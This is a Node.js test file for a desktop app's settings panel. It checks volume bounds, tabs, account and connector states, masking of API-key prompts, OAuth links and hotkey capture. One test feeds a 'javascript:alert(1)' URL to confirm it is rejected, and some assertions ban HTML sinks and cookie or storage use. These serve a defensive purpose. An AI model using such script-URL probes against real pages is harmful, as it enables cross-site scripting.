'use strict';
/* #306 — pure checks for frontend/settings-view.js (the settings panel's view-model).
   No DOM, no network, no secrets. Contracts: docs/desktop-visual-language.md §1-§4,
   apps/desktop-daemon/docs/PROTOCOL.md (Provider settings flow, Connectors frames),
   docs/r6-states-mapping (no hover-only meaning).
   Run: node apps/desktop-tauri/test-node/settings-view-check.cjs (also under cargo test). */
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const frontend = path.join(__dirname, '..', 'frontend');
const S = require(path.join(frontend, 'settings-view.js'));
let passed = 0;
const test = (_name, fn) => { fn(); passed += 1; };

test('F055 general volume uses default and inclusive boundaries without coercion', () => {
  assert.equal(S.generalView({}).sound.gain, 0.12);
  for (const gain of [0, 0.12, 0.2]) assert.equal(S.generalView({ gain }).sound.gain, gain);
  for (const gain of [-0.1, 0.21, NaN, Infinity, '0.1', null]) assert.equal(S.generalView({ gain }).sound.gain, 0.12);
  assert.equal(S.soundGainProblem(''), 'Ingresá un volumen entre 0 y 0,2.');
  for (const value of ['0', '0.12', '0.2']) assert.equal(S.soundGainProblem(value), '');
  for (const value of ['-0.01', '0.201', 'Infinity', 'NaN', 'junk']) assert.ok(S.soundGainProblem(value));
});

// T6.3 #434: the volume control becomes a SLIDER (design ajustes-ventana-general-*). The percent
// shown is the position inside the 0..0.2 range (the design's «60%» is exactly the 0.12 default).
test('T6.3 volume slider projection: percent of the 0..0.2 range, honest default for hostile input', () => {
  assert.equal(S.gainPercent(0), 0);
  assert.equal(S.gainPercent(0.12), 60);
  assert.equal(S.gainPercent(0.05), 25);
  assert.equal(S.gainPercent(0.2), 100);
  for (const bad of [-0.1, 0.21, NaN, Infinity, '0.1', null, undefined, 'junk']) {
    assert.equal(S.gainPercent(bad), 60, String(bad)); // the same default the view models (0.12)
  }
});

// T6.3 #434 (coordinator split): the design's segmented Auto-cierre «8 s / 15 s / 30 s / Nunca»
// with the contract's {0} ∪ 5..=120. A stored value outside the presets stays honest as its own
// selected segment; «Nunca» is a real value (stored 0), enabled and selected on a stored 0.
test('T6.3 auto-close segmented projection: presets, honest custom value, enabled Nunca', () => {
  const segs = S.autoCloseSegments(15);
  assert.deepEqual(segs.map(s => [s.seconds, s.selected]), [[8, false], [15, true], [30, false], [0, false]]);
  assert.equal(segs[3].label, 'Nunca');
  assert.equal(segs[3].disabled, false, '#438: «Nunca» is a real contract value now');
  assert.equal(segs[3].title, '');
  const never = S.autoCloseSegments(0);
  assert.deepEqual(never.map(s => [s.seconds, s.selected]), [[8, false], [15, false], [30, false], [0, true]],
    'a stored 0 selects «Nunca»');
  const custom = S.autoCloseSegments(20);
  assert.deepEqual(custom.map(s => [s.seconds, s.selected]), [[8, false], [15, false], [30, false], [20, true], [0, false]]);
  assert.equal(custom[3].label, '20 s', 'a stored non-preset value is shown as its own selected segment');
  assert.equal(custom[3].disabled, false);
  const fallback = S.autoCloseSegments(4); // hostile -> the same default the view models (15)
  assert.equal(fallback.filter(s => s.selected).length, 1);
  assert.equal(fallback.find(s => s.selected).seconds, 15);
});

// #460 E2: execute the shipped General renderer against a small DOM, without a browser.
// Structure adapted from windows/src/settings/main.ts (generalSection),
// Copyright (c) 2026 Louis Raillé, MIT. Only Abito controls and copy are rendered.
function generalHarness(overrides = {}) {
  const vm = require('node:vm');
  class Node {
    constructor(tag, cls = '', text = '') {
      this.tag = tag; this.className = cls; this.textContent = text;
      this.children = []; this.attrs = {}; this.events = {}; this.dataset = {}; this.value = '';
    }
    append(...nodes) { this.children.push(...nodes); }
    setAttribute(key, value) { this.attrs[key] = value; }
    addEventListener(type, fn) { this.events[type] = fn; }
    focus() {}
    fire(type, trusted = true) { this.events[type]({ isTrusted: trusted, preventDefault() {} }); }
  }
  const body = new Node('main'), calls = [], feedback = [];
  const ctx = vm.createContext({
    V: S, body, screen: 'general', window: {}, AVATAR: null,
    prefs: { sound: true, gain: 0.12, displayName: 'Ada', autoCloseSeconds: 15, openOnHover: false },
    hotkey: { combo: 'Ctrl+Space', enabled: true, status: 'active', backend: 'x11' },
    motionOverride: true, capturing: false, nameDraft: null, nameSaving: false, nameError: '',
    gainDraft: null, gainSaving: false, gainPending: null, gainError: '', autoSaving: false, autoError: '', themeError: '',
    el: (tag, cls, text) => new Node(tag, cls, text), sectionTitle: text => new Node('h2', '', text),
    chipNode: () => new Node('span'), wordBtn: (text, action) => {
      const button = new Node('button', '', text);
      button.addEventListener('click', e => { if (e.isTrusted) action(); });
      return button;
    },
    specialistIdentities: () => ({ identities: [] }), render() {}, say: text => feedback.push(text),
    $: () => null, fail: false,
  });
  ctx.call = (command, payload) => {
    calls.push({ command, ...payload });
    return { then(ok, bad) { if (ctx.fail) return bad(); return ok(ctx.prefs); } };
  };
  Object.assign(ctx, overrides);
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  const start = src.indexOf('  function toggleRow(');
  const end = src.indexOf('  // ---- #442 T7.4: the closed intents', start);
  assert.ok(start > 0 && end > start, 'the shipped renderer is exercised, not a duplicate');
  vm.runInContext(src.slice(start, end) + '\nrenderGeneral();', ctx);
  const walk = node => [node, ...node.children.flatMap(walk)];
  const find = id => walk(body).find(node => node.id === id);
  return { body, calls, feedback, ctx, find, walk };
}

test('T6 mounts Coucou sidebar and page without replacing existing tab hosts', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  const start = src.indexOf('  function mountSettingsFrame()');
  const end = src.indexOf('  // ---- settings frame end', start);
  assert.ok(start > 0 && end > start, 'shipped sidebar frame exists');
  const nodes = new Map(['settings-tabs', 'settings-bar', 'settings-hint', 'settings-body', 'models'].map(id => [id, { id }]));
  const panel = { children: [], append(...items) { this.children.push(...items); } };
  const el = (tag, className, textContent) => ({ tag, className, textContent, children: [], append(...items) { this.children.push(...items); } });
  require('node:vm').runInNewContext(src.slice(start, end) + '\nmountSettingsFrame();', { panel, el, $: id => nodes.get(id) });
  assert.deepEqual(panel.children.map(n => n.className), ['hub-side', 'hub-panel']);
  const [side, page] = panel.children;
  assert.equal(side.children[0].textContent, 'Abito');
  assert.equal(side.children[1], nodes.get('settings-tabs'));
  assert.deepEqual(page.children.map(n => n.id), ['settings-bar', 'settings-hint', 'settings-body', 'models']);
  const html = fs.readFileSync(path.join(frontend, 'index.html'), 'utf8');
  assert.match(html, /id="coucou-settings-style"[^>]*href="vendor\/coucou\/settings\/settings.css"[^>]*media="not all"/);
  assert.match(src, /\$\('coucou-settings-style'\)\.media = 'all'/);
});

test('T6 General preserves every group, now including motion and theme', () => {
  const h = generalHarness();
  assert.deepEqual(h.body.children.map(sec => sec.children[0].textContent), ['Perfil', 'Isla', 'Sonido', 'Atajo global', 'Movimiento', 'Tema']);
  const sound = h.body.children[2];
  assert.ok(sound.children.some(row => h.walk(row).includes(h.find('sw-sound')) && h.walk(row).includes(h.find('settings-sound-gain'))),
    'sound toggle and volume belong to the same row, as in the MIT General pattern');
  assert.equal(h.find('settings-display-name').value, 'Ada');
  assert.equal(h.find('settings-sound-gain').value, '0.12');
  assert.equal(h.find('settings-sound-gain-value').textContent, '60%');
});

test('#460 General gestures keep the closed prefs commands and announce rejected sound saves', () => {
  const h = generalHarness();
  h.find('sw-sound').fire('click', false);
  assert.equal(h.calls.length, 0, 'synthetic gestures never write');
  h.find('sw-sound').fire('click');
  assert.deepEqual(h.calls.pop(), { command: 'prefs_action', action: 'sound_off' });
  h.ctx.fail = true;
  h.find('sw-sound').fire('click');
  assert.match(h.feedback.at(-1), /No se pudo guardar/);
  assert.equal(h.ctx.prefs.sound, true, 'failed saves keep the stored preference');
  h.ctx.fail = false;
  h.find('sw-island-hover').fire('click');
  assert.deepEqual(h.calls.pop(), { command: 'prefs_action', action: 'set_island_interaction', auto_close_seconds: 15, open_on_hover: true });
  h.find('autoclose-never').fire('click');
  assert.deepEqual(h.calls.pop(), { command: 'prefs_action', action: 'set_island_interaction', auto_close_seconds: 0, open_on_hover: false });
  const gain = h.find('settings-sound-gain'); gain.value = '0.05'; gain.fire('input'); gain.fire('change');
  assert.deepEqual(h.calls.pop(), { command: 'prefs_action', action: 'set_sound_gain', gain: 0.05 });
});

test('T6 name validation, trusted submission and failed save retain the draft', () => {
  const h = generalHarness();
  const input = h.find('settings-display-name');
  const form = h.walk(h.body).find(n => n.tag === 'form');
  input.value = 'x'.repeat(81); input.fire('input');
  assert.equal(input.attrs['aria-invalid'], 'true');
  form.fire('submit'); assert.equal(h.calls.length, 0);
  input.value = 'Grace'; input.fire('input');
  assert.equal(input.attrs['aria-invalid'], 'false');
  form.fire('submit', false); assert.equal(h.calls.length, 0);
  h.ctx.fail = true; form.fire('submit');
  assert.deepEqual(h.calls.pop(), { command: 'prefs_action', action: 'set_display_name', display_name: 'Grace' });
  assert.equal(h.ctx.nameDraft, 'Grace');
  assert.match(h.ctx.nameError, /No se pudo guardar/);
  h.ctx.fail = false; form.fire('submit');
  assert.equal(h.ctx.nameDraft, null);
});

test('T6 volume saves on release, queues latest in-flight value and reports failures', () => {
  const saves = [];
  const h = generalHarness({ call: (command, payload) => ({ then(ok, bad) { saves.push({ command, payload, ok, bad }); } }) });
  const slider = h.find('settings-sound-gain');
  slider.value = '0.05'; slider.fire('input');
  assert.equal(saves.length, 0, 'dragging never persists');
  assert.equal(slider.attrs['aria-valuetext'], '25%');
  slider.fire('change');
  slider.value = '0.10'; slider.fire('input'); slider.fire('change');
  slider.value = '0.20'; slider.fire('input'); slider.fire('change');
  assert.equal(saves.length, 1);
  saves[0].ok({ ...h.ctx.prefs, gain: 0.05 });
  assert.equal(saves.length, 2);
  assert.equal(saves[1].payload.gain, 0.2, 'only the most recent release survives');
  saves[1].ok({ ...h.ctx.prefs, gain: 0.2 });
  assert.equal(h.ctx.gainDraft, null);
  slider.value = '0.01'; slider.fire('change'); saves[2].bad();
  assert.equal(h.ctx.prefs.gain, 0.2);
  assert.match(h.ctx.gainError, /No se pudo guardar/);
});

test('T6 shortcut capture/reset/toggle and backend explanation remain accessible', () => {
  const h = generalHarness({ hotkey: { combo: 'Ctrl+Space', enabled: true, backend: 'portal', portal_note: 'permission_denied' } });
  const buttons = h.walk(h.body);
  buttons.find(n => n.textContent === 'Cambiar').fire('click');
  assert.equal(h.ctx.capturing, true);
  buttons.find(n => n.textContent === 'Original').fire('click');
  assert.deepEqual(h.calls.pop(), { command: 'hotkey_action', action: 'reset' });
  h.find('sw-hotkey').fire('click');
  assert.deepEqual(h.calls.pop(), { command: 'hotkey_action', action: 'disable' });
  assert.ok(buttons.some(n => /Rechazaste el permiso/.test(n.textContent)));
});

test('T6 General keeps reduced motion and all theme choices; custom auto-close is not rewritten', () => {
  const motion = [], themes = [];
  const h = generalHarness({
    prefs: { autoCloseSeconds: 20, openOnHover: true, theme: 'light' },
    window: { desktop: { respectSystemMotion: () => ({ then(ok) { motion.push('respect'); ok({ motionOverride: false }); } }) } },
    chooseTheme: id => themes.push(id),
  });
  assert.equal(h.find('autoclose-20').attrs['aria-checked'], 'true');
  assert.equal(h.calls.length, 0, 'render does not normalize the stored custom interval');
  h.find('sw-island-hover').fire('click');
  assert.deepEqual(h.calls.pop(), { command: 'prefs_action', action: 'set_island_interaction', auto_close_seconds: 20, open_on_hover: false });
  h.find('sw-motion').fire('click');
  assert.deepEqual(motion, ['respect']);
  assert.equal(h.ctx.motionOverride, false);
  assert.equal(h.find('theme-mode-light').attrs['aria-checked'], 'true');
  for (const mode of ['system', 'light', 'dark']) h.find(`theme-mode-${mode}`).fire('click');
  assert.deepEqual(themes, ['system', 'light', 'dark']);
});

// ---- screens (copied from gentle-dot: one screen per header button, each covering the chat body) -------
test('#442 T7.4 five sub-tabs of ONE Ajustes entry, design order (DESIGN-NOTES §3/§9): General, Conexiones, Modelos, Blobs, Apariencia — Especialistas is merged into Blobs', () => {
  assert.deepEqual(S.TABS.map(x => x.id), ['general', 'accounts', 'models', 'pills', 'appearance']);
  assert.deepEqual(S.TABS.map(x => x.title), ['General', 'Conexiones', 'Modelos', 'Blobs', 'Apariencia']);
  // S8: the old ids still resolve (deep links), to the merged tab
  assert.equal(S.tabAlias('connectors'), 'accounts');
  assert.equal(S.tabAlias('accounts'), 'accounts');
  assert.equal(S.tabAlias('models'), 'models');
  // #442 T7.4: the Especialistas deep link resolves to the tab that absorbed it
  assert.equal(S.tabAlias('specialists'), 'pills');
  assert.equal(S.tabAlias('nope'), null);
  // T7.2 design §3: one title + one hint line at most. Modelos keeps the design's own line; the
  // other tabs draw none (the regenerated ajustes-ventana-* PNGs show no hint line). Was: every
  // tab a multi-sentence hint (hint.length > 10).
  for (const x of S.TABS) {
    assert.ok(x.icon, x.id);
    if (x.id === 'models') assert.equal(x.hint, 'Modelos que usa Koda', x.id);
    else assert.equal(x.hint, '', x.id);
  }
  assert.equal(S.tabById('connectors'), null, 'resolved through tabAlias, not a tab of its own');
  assert.equal(S.tabById('nope'), null);
  assert.equal(S.SCREENS, undefined);
});

test('#408 tablist keyboard: arrows wrap, Home/End jump, other keys are ignored', () => {
  assert.equal(S.tabKeyTarget('general', 'ArrowRight'), 'accounts');
  assert.equal(S.tabKeyTarget('accounts', 'ArrowRight'), 'models');
  assert.equal(S.tabKeyTarget('models', 'ArrowRight'), 'pills');
  assert.equal(S.tabKeyTarget('appearance', 'ArrowRight'), 'general');
  assert.equal(S.tabKeyTarget('general', 'ArrowLeft'), 'appearance');
  assert.equal(S.tabKeyTarget('pills', 'Home'), 'general');
  assert.equal(S.tabKeyTarget('pills', 'End'), 'appearance');
  assert.equal(S.tabKeyTarget('pills', 'a'), null);
  assert.equal(S.tabKeyTarget('nope', 'ArrowRight'), null);
});

// ---- connection chip -------------------------------------------------------------
test('the daemon connection is one icon + one word; a problem is never hidden', () => {
  assert.equal(S.connectionView({ connection: 'connected' }), null, 'a working connection shows nothing');
  const none = S.connectionView({ connection: 'no_daemon' });
  assert.deepEqual([none.word, none.icon, none.tone], ['Sin motor', 'plug-off', 'faint']);
  assert.match(none.aria, /no está corriendo/);
  assert.equal(S.connectionView({ connection: 'lost' }).word, 'Motor caído');
  assert.equal(S.connectionView({ connection: 'lost' }).tone, 'red');
  assert.equal(S.connectionView({ connection: 'bad_session' }).word, 'Sesión no válida');
  assert.equal(S.connectionView({ connection: 'refused' }).word, 'Motor no responde');
  assert.equal(S.connectionView(null).word, 'Conectando', 'no state yet is a wait, not «Sin motor» (see #310)');
  assert.equal(S.connectionView({ connection: 'whatever' }).word, 'Sin motor', 'unknown = honest «no motor», never «connected»');
});

// ---- providers & accounts ----------------------------------------------------------------
const state = (extra = {}) => ({ connection: 'connected', providers: [
  { id: 'anthropic', name: 'Anthropic', methods: ['api_key', 'oauth'], configured: false },
  { id: 'openai', name: 'OpenAI', methods: ['oauth'], configured: true }], accounts: [
  { accountId: 'personal', label: 'Personal', provider: 'anthropic', authMethod: 'api_key', configured: true },
  { accountId: 'work', label: 'Trabajo', provider: 'openai', authMethod: 'none', configured: false },
  { accountId: 'lmstudio', label: 'LM Studio', provider: 'local-lmstudio', authMethod: 'api_key', configured: true, local: true }],
  profiles: { profiles: [{ id: 'main', label: 'Principal', provider: 'anthropic', modelId: 'claude' }], active: 'main' },
  auth: { flowId: null, prompt: null, event: null, last: null }, connectors: { state: 'loading', items: [] }, ...extra });

test('accounts: name + provider chip + a state that never says «ready» for an account that is not signed in', () => {
  const rows = S.accountRows(state());
  assert.deepEqual(rows.map(r => r.label), ['Personal', 'Trabajo', 'LM Studio']);
  const [personal, work, local] = rows;
  assert.equal(personal.providerName, 'Anthropic');
  assert.deepEqual([personal.state.word, personal.state.tone], ['', 'go']);
  assert.equal(personal.active, true, 'the active profile uses it');
  assert.deepEqual([work.state.word, work.state.icon, work.state.tone], ['Sin sesión', 'plug-off', 'faint']);
  assert.equal(work.actions.includes('login'), true);
  assert.equal(personal.actions.includes('logout'), true);
  assert.equal(local.local, true); assert.equal(local.chips.some(c => c.text === 'local'), true);
  assert.equal(local.actions.includes('login'), false, 'a local endpoint takes no key/login');
  // an account the active profile uses cannot be removed (the daemon refuses: hide the dead action)
  assert.equal(personal.actions.includes('remove'), false);
  assert.equal(work.actions.includes('remove'), true);
});

test('login methods come only from what the provider offers, in a fixed preference', () => {
  assert.deepEqual(S.loginMethods(state(), 'personal'), ['api_key', 'oauth']);
  assert.deepEqual(S.loginMethods(state(), 'work'), ['oauth']);
  assert.deepEqual(S.loginMethods(state(), 'ghost'), []);
});

test('create account: needs a provider from the list and a safe label; the form says one word when invalid', () => {
  assert.deepEqual(S.createValidity(state(), 'anthropic', 'Mi cuenta'), { ok: true, word: '' });
  assert.equal(S.createValidity(state(), '', 'Mi cuenta').ok, false);
  assert.equal(S.createValidity(state(), 'nope', 'Mi cuenta').ok, false, 'a provider the daemon did not list is refused');
  assert.equal(S.createValidity(state(), 'anthropic', '   ').word, '');
  assert.equal(S.createValidity(state(), 'anthropic', '').ok, false);
  assert.equal(S.createValidity(state(), 'anthropic', 'x'.repeat(81)).word, 'Muy largo');
  assert.equal(S.createValidity(state(), 'anthropic', 'a\nb').word, 'No válido');
  assert.equal(S.createValidity(state({ connection: 'no_daemon' }), 'anthropic', 'ok').ok, false, 'no daemon, no create');
});

// ---- the sign-in flow: secrets -------------------------------------------------------------------
test('a key-like prompt is ALWAYS masked, even when a provider forgot the secret flag', () => {
  const p = (over) => ({ flowId: 'f', promptId: 'p', kind: 'input', message: 'Pegá tu API key', secret: false, ...over });
  assert.equal(S.maskInput(p({ secret: true })), true);
  assert.equal(S.maskInput(p({ message: 'Enter your API key' })), true);
  assert.equal(S.maskInput(p({ message: 'Token de acceso' })), true);
  assert.equal(S.maskInput(p({ message: 'Contraseña' })), true);
  assert.equal(S.maskInput(p({ message: 'Secret' })), true);
  assert.equal(S.maskInput(p({ placeholder: 'sk-...' , message: 'Valor' })), true);
  assert.equal(S.maskInput(p({ message: 'Nombre del proyecto' })), false);
  assert.equal(S.maskInput(null), true, 'no prompt data = mask (safer default)');
});

test('prompt view: select options are buttons with labels; an input is a field; never a value', () => {
  const input = S.promptView({ flowId: 'f', promptId: 'p', kind: 'input', message: 'Pegá tu API key', secret: true, placeholder: '', options: [] });
  assert.equal(input.control, 'input'); assert.equal(input.masked, true); assert.equal(input.message, 'Pegá tu API key');
  assert.equal(Object.keys(input).includes('value'), false);
  const select = S.promptView({ flowId: 'f', promptId: 'p', kind: 'select', message: 'Elegí', secret: false, options: [{ id: 'a', label: 'Opción A' }, { id: 'b', label: 'Opción B' }] });
  assert.equal(select.control, 'select'); assert.deepEqual(select.options.map(o => o.label), ['Opción A', 'Opción B']);
  assert.equal(S.promptView(null), null);
});

test('reply validity mirrors the Rust bounds (the host is still the authority)', () => {
  assert.equal(S.replyValid('sk-abc'), true);
  assert.equal(S.replyValid(''), false); assert.equal(S.replyValid('   '), false, 'whitespace only is not a key');
  assert.equal(S.replyValid('a\u0000b'), false); assert.equal(S.replyValid('x'.repeat(4097)), false);
  assert.equal(S.replyValid('x'.repeat(4096)), true);
});

test('OAuth events: device code and link are shown; a non-https link is NEVER offered', () => {
  const ev = S.eventView({ kind: 'url', message: 'Abrí el enlace', userCode: 'ABCD-1234', url: 'https://example.com/device', instructions: '' });
  assert.equal(ev.userCode, 'ABCD-1234'); assert.equal(ev.link, 'https://example.com/device');
  assert.equal(S.eventView({ kind: 'url', url: 'javascript:alert(1)', userCode: 'X' }).link, null);
  assert.equal(S.eventView({ kind: 'url', url: 'http://example.com' }).link, null, 'plain http is not a login link');
  assert.equal(S.eventView(null), null);
});

test('flow outcome: «Listo» only on a real ok; a cancel/failure says so; nothing infers success', () => {
  assert.deepEqual([S.flowOutcome({ ok: true }).word, S.flowOutcome({ ok: true }).tone], ['Conectada', 'go']);
  assert.deepEqual([S.flowOutcome({ ok: false, cancelled: true }).word, S.flowOutcome({ ok: false, cancelled: true }).tone], ['Cancelado', 'faint']);
  assert.deepEqual([S.flowOutcome({ ok: false }).word, S.flowOutcome({ ok: false }).tone], ['No se pudo', 'red']);
  assert.equal(S.flowOutcome(null), null);
});

// ---- connectors --------------------------------------------------------------------------------------------
test('connectors: honest «no disponible» when the daemon has no connectorsCommand; states by icon+word', () => {
  assert.equal(S.connectorsView({ connectors: { state: 'unavailable', items: [] } }).kind, 'unavailable');
  assert.equal(S.connectorsView({ connectors: { state: 'unavailable', items: [] } }).word, 'No disponible');
  assert.equal(S.connectorsView({ connectors: { state: 'failed', items: [] } }).word, 'Sin datos');
  assert.equal(S.connectorsView({ connectors: { state: 'loading', items: [] } }).kind, 'loading');
  const ready = S.connectorsView({ connectors: { state: 'ready', items: [
    { id: 'gmail', label: 'Gmail', mode: 'read_only', enabled: true, configured: true, status: 'connected' },
    { id: 'slack', label: 'Slack', mode: 'read_and_send', enabled: true, configured: true, status: 'failed' },
    { id: 'drive', label: 'Drive', mode: 'read_only', enabled: false, configured: true, status: 'disabled' },
    { id: 'cal', label: 'Calendario', mode: 'read_only', enabled: true, configured: false, status: 'needs_setup' },
    { id: 'x', label: 'Otro', mode: 'weird', enabled: true, configured: true, status: 'surprise' }] } });
  assert.equal(ready.kind, 'ready');
  assert.deepEqual(ready.items.map(i => [i.label, i.word, i.tone]), [
    ['Gmail', '', 'go'], ['Slack', 'Falló', 'red'], ['Drive', 'Apagado', 'faint'], ['Calendario', 'Falta configurar', 'sun'], ['Otro', 'Desconocido', 'faint']]);
  assert.equal(ready.items[1].sends, true, 'read_and_send is shown (chip «puede enviar»)');
  assert.equal(ready.items[0].sends, false);
  assert.equal(S.connectorsView({ connectors: { state: 'ready', items: [] } }).empty, true);
  // T7.2 copy diet: the services note paragraph is gone (design draws none). Was: CONNECTORS_NOTE /guardad/i.
  assert.ok(!('CONNECTORS_NOTE' in S), 'the services note paragraph is removed with its constant');
});

// ---- general --------------------------------------------------------------------------------------------------------
test('general: sound switch is persisted (default ON), motion is «respect the system» (default animate), hotkey shows its backend state', () => {
  assert.equal(S.soundDefault(), true, 'sound is on by default (human decision); only a stored explicit off silences it');
  const g = S.generalView({ sound: false, motionOverride: true, hotkey: { combo: 'Ctrl+Alt+A', enabled: true, status: 'active', limited: false, backend: 'portal', portal_note: null } });
  assert.equal(g.sound.on, false);
  assert.equal(g.motion.respectSystem, false, 'motionOverride true = animate (do NOT honor the system)');
  assert.equal(S.generalView({ sound: true, motionOverride: false, hotkey: null }).motion.respectSystem, true);
  assert.equal(S.generalView({ sound: true, motionOverride: false, hotkey: null }).sound.on, true);
  assert.equal(g.hotkey.combo, 'Ctrl+Alt+A'); assert.equal(g.hotkey.backendLabel, 'Atajo del sistema');
  const x11 = S.generalView({ sound: false, motionOverride: true, hotkey: { combo: 'Ctrl+Alt+A', enabled: true, status: 'active', limited: true, backend: 'x11', portal_note: 'permission_denied' } });
  assert.equal(x11.hotkey.backendLabel, 'Atajo limitado (X11)'); assert.match(x11.hotkey.note, /rechazaste/i);
  // U3a: Windows' RegisterHotKey is a REAL backend. Normalizing anything that
  // is not portal to «Atajo de X11» is precisely the lie the port must not ship.
  const win = S.generalView({ sound: false, motionOverride: true, hotkey: { combo: 'Ctrl+Alt+A', enabled: true, status: 'active', limited: false, backend: 'win32', portal_note: null } });
  assert.equal(win.hotkey.backend, 'win32');
  assert.equal(win.hotkey.backendLabel, 'Atajo de Windows');
  const mac = S.generalView({ sound: false, motionOverride: true, hotkey: { combo: 'Ctrl+Alt+A', enabled: true, status: 'active', limited: false, backend: 'macos', portal_note: null } });
  assert.equal(mac.hotkey.backend, 'macos');
  assert.equal(mac.hotkey.backendLabel, 'Atajo de macOS');
  const winTaken = S.generalView({ sound: false, motionOverride: true, hotkey: { combo: 'Ctrl+Alt+A', enabled: true, status: 'taken', limited: false, backend: 'win32', portal_note: null } });
  assert.equal(winTaken.hotkey.backendLabel, 'Atajo de Windows', 'a denied grab still names the right backend');
  assert.equal(S.generalView({ sound: false, motionOverride: true, hotkey: { combo: 'Ctrl+Alt+A', enabled: false, status: 'disabled', limited: false, backend: 'x11', portal_note: null } }).hotkey.enabled, false);
  assert.equal(S.generalView({}).sound.on, false); assert.equal(S.generalView(null).hotkey, null);
});

test('hotkey capture: a pressed combination becomes the canonical text; Escape cancels; bare keys are refused', () => {
  const ev = (key, extra = {}) => ({ key, code: 'Key' + String(key).toUpperCase(), ctrlKey: false, altKey: false, shiftKey: false, metaKey: false, isTrusted: true, isComposing: false, repeat: false, ...extra });
  assert.deepEqual(S.captureCombo(ev('a', { ctrlKey: true, altKey: true })), { kind: 'combo', text: 'Ctrl+Alt+A' });
  assert.deepEqual(S.captureCombo(ev('7', { code: 'Digit7', metaKey: true, shiftKey: true })), { kind: 'combo', text: 'Shift+Super+7' });
  assert.deepEqual(S.captureCombo(ev('F5', { code: 'F5', ctrlKey: true })), { kind: 'combo', text: 'Ctrl+F5' });
  assert.deepEqual(S.captureCombo(ev(' ', { code: 'Space', altKey: true })), { kind: 'combo', text: 'Alt+Space' });
  assert.equal(S.captureCombo(ev('Escape', { code: 'Escape' })).kind, 'cancel');
  assert.equal(S.captureCombo(ev('a')).kind, 'needs_modifier', 'a bare key would steal typing');
  assert.equal(S.captureCombo(ev('a', { shiftKey: true })).kind, 'needs_modifier');
  assert.equal(S.captureCombo(ev('Control', { code: 'ControlLeft', ctrlKey: true })).kind, 'wait', 'a modifier alone keeps listening');
  assert.equal(S.captureCombo(ev('Enter', { code: 'Enter', ctrlKey: true })).kind, 'unsupported');
  assert.equal(S.captureCombo(ev('a', { ctrlKey: true, isTrusted: false })).kind, 'ignore', 'synthetic events never set a shortcut');
  assert.equal(S.captureCombo(ev('a', { ctrlKey: true, isComposing: true })).kind, 'ignore');
  assert.equal(S.captureCombo(ev('a', { ctrlKey: true, repeat: true })).kind, 'ignore');
});

// ---- accessibility / markup contract ------------------------------------------------------------------------------------------
test('markup: gear + every icon-only control is named; sections are real tabs; the page keeps voseo', () => {
  const html = fs.readFileSync(path.join(frontend, 'index.html'), 'utf8');
  assert.match(html, /<script defer src="settings-view\.js"><\/script>/);
  assert.match(html, /<script defer src="settings\.js"><\/script>/);
  assert.match(html, /id="open-settings"[^>]*aria-label="Ajustes"/);
  assert.match(html, /id="settings"[^>]*role="dialog"[^>]*aria-label="Ajustes"/);
  assert.match(html, /id="settings-tabs"[^>]*role="tablist"[^>]*aria-label="[^"]{3,}"/, '#408: a real tablist');
  for (const id of ['accounts', 'connectors']) assert.doesNotMatch(html, new RegExp(`id="open-screen-${id}"`), id + ' has no header button of its own');
  assert.doesNotMatch(html, /id="chat-models"/, 'the Modelo header button moved into the Modelos tab');
  const gear = /<button[^>]*id="open-screen-settings"[^>]*>/.exec(html);
  assert.ok(gear); assert.match(gear[0], /aria-label="Ajustes"/); assert.match(gear[0], /aria-expanded="false"/);
  assert.match(html, /<h2[^>]*id="settings-title"/, 'the screen title is a real heading');
  assert.match(html, /id="settings-close"[^>]*aria-label="[^"]{3,}"/);
});
test('wiring: only the closed IPC; a masked field never reaches the DOM as text and is cleared after sending', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.match(src, /agent_action/); assert.match(src, /prefs_action/); assert.match(src, /hotkey_action/);
  assert.doesNotMatch(src, /localStorage|sessionStorage|indexedDB|document\.cookie/, 'no secret or setting is kept in the page');
  assert.doesNotMatch(src, /console\.(log|info|debug)/, 'nothing is logged from the settings page');
  // NO markup is written at all: icons are DOM nodes from the closed registry
  assert.doesNotMatch(src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, ''), /innerHTML|outerHTML|insertAdjacentHTML|document\.write/, 'no markup sink in settings.js');
  assert.match(src, /new DOMParser\(\)/);
  assert.match(src, /\.type = prompt\.masked \? 'password' : 'text'/, 'a masked prompt renders a password input');
  assert.match(src, /autocomplete = 'off'|autocomplete="off"|new-password/, 'the browser never offers to save a key');
  assert.match(src, /\.value = ''/, 'the field is cleared after the reply is sent');
  assert.match(src, /N\.trusted\(event\)|isTrusted/, 'only trusted gestures change a setting');
});

test('the probe seam is one inert CustomEvent that only selects a tab (never a setting), and no global hook exists', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.match(src, /addEventListener\('abito:settings-select'/);
  assert.doesNotMatch(src, /window\.__[A-Za-z]+\s*=/, 'no window-level test hook in the shipped file');
  const seam = src.slice(src.indexOf("addEventListener('abito:settings-select'"), src.indexOf("addEventListener('abito:settings-select'") + 380);
  assert.doesNotMatch(seam, /agent\(|prefs_action|hotkey_action|animateAnyway|respectSystemMotion/, 'the seam cannot change a setting');
});

test('connectors: without a live engine «loading» is never an endless spinner (honest «sin motor»)', () => {
  for (const connection of ['no_daemon', 'lost', 'bad_session', 'refused']) {
    const state = { connection, connectors: { state: 'loading', items: [] } };
    const v = S.connectorsView(state);
    assert.notEqual(v.kind, 'loading', connection);
    assert.equal(v.word, S.connectionView(state).word, `${connection}: same honest word as the connection chip`);
  }
  assert.equal(S.connectorsView({ connection: 'no_daemon', connectors: { state: 'loading', items: [] } }).word, 'Sin motor');
  assert.equal(S.connectorsView({ connection: 'connecting', connectors: { state: 'loading', items: [] } }).kind, 'loading', 'connecting is a real wait');
  assert.equal(S.connectorsView({ connection: 'connected', connectors: { state: 'loading', items: [] } }).kind, 'loading');
});

test('style: form fields are dark controls (the provider select was white with unreadable text)', () => {
  const css = fs.readFileSync(path.join(__dirname, '..', 'frontend', 'style.css'), 'utf8');
  const rule = css.slice(css.indexOf('.sfield {'), css.indexOf('}', css.indexOf('.sfield {')));
  assert.match(rule, /color-scheme:\s*dark/);
  assert.match(css, /select\.sfield\s*\{[^}]*appearance:\s*none/);
});

// ---- never announce a result the engine did not give (verifier, #306) --------------------------
